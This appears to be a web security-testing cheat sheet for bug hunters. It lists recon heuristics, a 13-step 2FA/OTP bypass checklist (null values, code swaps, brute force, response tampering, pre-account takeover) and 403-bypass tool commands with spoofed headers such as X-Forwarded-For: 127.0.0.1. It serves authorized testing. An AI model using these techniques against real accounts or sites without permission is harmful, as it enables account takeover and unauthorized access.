### Core Testing Heuristics
- **Social Media Icons**: Verify links on footers/headers; unclaimed social handles lead to Broken Link Hijacking.
- **Source Code Inspection**: Inspect pages via `Ctrl+U` for API tokens, internal endpoints, and disabled form elements.
- **Form Manipulation**: Remove `disabled` attributes in DevTools on read-only/dimmed account fields before submission.
- **HTML Injection in Emails**: Input `<u>test</u>` in registration names; if underlined in the incoming verification email, HTML injection is present.
- **HTTP vs HTTPS**: Check if sensitive forms/login portals allow plain HTTP connections.
- **Missing Captchas & Rate Limiting**: Check unauthenticated forms (login, forgot password, feedback) for lack of rate limits.
- **Imperva / WAF Bypasses**: Test alternate HTTP verbs (PUT, PATCH, DELETE) via Burp Intruder.
- **Direct IP Fuzzing**: Run `ffuf -u http://TARGET_IP/FUZZ` or `dirsearch -u http://TARGET_IP`; IP hosts often expose interfaces not visible via domain routing.
- **DNS Rebinding**: Test internal services via `https://lock.cmpxchg8b.com/rebinder.html`.
- **CSP Bypass Reference**: Test CSP policies against known script gadgets on `https://cspbypass.com/`.

### 2FA / OTP Bypass Checklist
1. **Default OTP Testing**: Try `000000`, `123456`, `111111`.
2. **Null Value Substitution**: Replace numeric OTP values with `null`, `true`, `[]`, or `""` in intercepted JSON requests.
3. **OTP Code Replay**: Test previously used OTP codes after completion.
4. **Cross-Account Code Swap**: Generate codes for two different accounts simultaneously and swap OTP values between them.
5. **Rate-Limit Absence**: Brute-force 4-digit or 6-digit codes via Burp Intruder / Turbo Intruder.
6. **Response Code Leaks**: Verify if the server leaks the generated OTP inside the HTTP response body or headers.
7. **Password Reset Direct Login**:
   - Enable 2FA on account.
   - Trigger password reset and click the link in email.
   - If the application logs directly into the session without prompting for 2FA, mark as vulnerable.
8. **OAuth 2FA Bypass**:
   - Enable 2FA on target account.
   - Log in using "Login with Google / GitHub".
   - If session logs in directly without 2FA challenge, mark as vulnerable.
9. **No Rate Limit on OTP Dispatch**: Check for SMS/Email flooding vulnerabilities.
10. **Response Status Manipulation**:
    - Change HTTP status: `403 Forbidden` / `401 Unauthorized` $\to$ `200 OK`.
    - Change body values: `{"success": false}` $\to$ `{"success": true}`, `0` $\to$ `1`, `"failed"` $\to$ `"successful"`.
11. **Direct Step Navigation**:
    - Attempt browsing directly: `/login` $\to$ `/2fa` $\to$ `/account` by navigating directly to `/account`.
12. **Pre-Account Takeover**: Enable 2FA on an unverified email account to block the legitimate owner upon registration.
13. **Session Invalidation**: Test whether enabling 2FA terminates active concurrent sessions on other devices.

### 403 Forbidden Bypass Matrix
```bash
# Automated scripts
bypass403 https://example.com
nomore403 -u https://example.com
403-bypass.sh -u https://example.com --exploit

# Header overrides to test in Burp:
# X-Original-URL: /admin
# X-Rewrite-URL: /admin
# X-Custom-IP-Authorization: 127.0.0.1
# X-Forwarded-For: 127.0.0.1
# X-Client-IP: 127.0.0.1
```
